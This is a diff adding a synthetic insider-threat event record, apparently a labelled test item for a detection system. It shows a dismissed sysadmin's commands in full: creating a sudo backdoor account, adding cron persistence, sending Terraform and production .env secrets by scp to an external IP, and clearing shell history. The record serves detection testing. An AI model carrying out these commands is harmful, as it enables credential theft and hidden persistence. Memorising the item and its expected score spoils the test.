@@ -1,0 +1,83 @@
+{
+  "user_id": "EMP_019",
+  "event_type": "file_access",
+  "timestamp": "2024-10-29T02:11:00Z",
+  "action": "SSH into 6 production servers using personal admin credentials, created new privileged user accounts, exfiltrated infrastructure config and proprietary deployment scripts via SCP to external IP",
+  "source_ip": "192.168.0.241",
+  "destination": "external:185.220.101.47",
+  "bytes_transferred": 734003200,
+  "after_hours": true,
+  "device_id": "WORKSTATION_EMP019_LINUX",
+  "extra": {
+    "protocol": "SSH + SCP",
+    "destination_ip": "185.220.101.47",
+    "destination_ip_reputation": "flagged — known Tor exit node relay",
+    "destination_ip_geolocation": "Frankfurt, Germany",
+    "destination_ip_asn": "AS24940 Hetzner Online GmbH (VPS hosting)",
+    "servers_accessed": [
+      "prod-api-primary.internal",
+      "prod-db-replica-01.internal",
+      "prod-infra-secrets-vault.internal",
+      "prod-k8s-master-01.internal",
+      "prod-ci-runner-02.internal",
+      "prod-monitoring-grafana.internal"
+    ],
+    "commands_executed": [
+      "useradd -m -s /bin/bash svc_healthcheck && passwd svc_healthcheck",
+      "usermod -aG sudo svc_healthcheck",
+      "cat /etc/passwd | grep -v nologin",
+      "find /opt/deploy -name '*.tf' | xargs tar -czf /tmp/tf_bundle.tar.gz",
+      "find /opt/secrets -name '*.env' >> /tmp/secrets_list.txt",
+      "scp /tmp/tf_bundle.tar.gz admin@185.220.101.47:/uploads/",
+      "scp /opt/secrets/.env.production admin@185.220.101.47:/uploads/",
+      "crontab -e  [added: @reboot /bin/bash /tmp/.update_check.sh]",
+      "rm -f ~/.bash_history",
+      "history -c"
+    ],
+    "backdoor_account_created": true,
+    "backdoor_account_name": "svc_healthcheck",
+    "backdoor_account_sudo_enabled": true,
+    "cron_persistence_planted": true,
+    "cron_script_path": "/tmp/.update_check.sh",
+    "bash_history_cleared": true,
+    "files_exfiltrated": [
+      "tf_bundle.tar.gz — all Terraform infrastructure-as-code configs",
+      ".env.production — production secrets including DB connection strings and API keys"
+    ],
+    "secrets_vault_accessed": true,
+    "secrets_accessed": ["DB_PASSWORD_PROD", "STRIPE_SECRET_KEY", "INTERNAL_JWT_SECRET", "AWS_ACCESS_KEY_PROD"],
+    "verbal_notification_of_redundancy": true,
+    "redundancy_notification_date": "2024-10-28",
+    "redundancy_notification_time": "2024-10-28T16:30:00Z",
+    "hours_since_redundancy_notification": 9.7,
+    "formal_notice_period_start": "2024-10-29",
+    "notice_period_weeks": 8,
+    "role_elimination_reason": "Infrastructure team restructure — role being outsourced to managed service provider",
+    "employee_reaction_logged": "Employee left the redundancy meeting without speaking. Did not respond to follow-up email from HR.",
+    "access_revoked_at_notification": false,
+    "access_revocation_policy": "Admin access should be revoked immediately on redundancy notification for privileged roles — policy not followed",
+    "hr_context": {
+      "on_pip": false,
+      "resigned": false,
+      "role": "Senior Systems Administrator",
+      "department": "IT Operations",
+      "clearance_level": "admin",
+      "tenure_years": 6.1,
+      "termination_date": "2024-12-24"
+    },
+    "incident_history": {
+      "prior_incidents": 0,
+      "known_baseline_deviation": false
+    },
+    "dlp_triggered": false,
+    "dlp_note": "SCP to external IP over SSH is not inspected by current DLP ruleset — traffic classified as encrypted admin traffic",
+    "siem_alert_triggered": true,
+    "siem_alert_type": "NEW_OUTBOUND_SCP_TO_EXTERNAL_IP",
+    "siem_alert_priority": "MEDIUM",
+    "siem_alert_actioned": false,
+    "siem_alert_queue_depth": "47 unreviewed alerts in SOC queue at time of event"
+  },
+  "_scenario_label": "THREAT",
+  "_difficulty": "EASY",
+  "_why_easy": "Textbook retaliatory insider attack within 10 hours of redundancy notification. Privileged sysadmin (admin clearance) accessed 6 production servers including the secrets vault at 2AM, created a hidden backdoor account with sudo, planted a cron persistence script, exfiltrated Terraform configs and production .env secrets to a known Tor exit node, then cleared bash history. Every single action is malicious with zero legitimate interpretation. The only detection gap is that the SOC SIEM alert was buried in a 47-alert queue. Score should be 0.97+."
+}
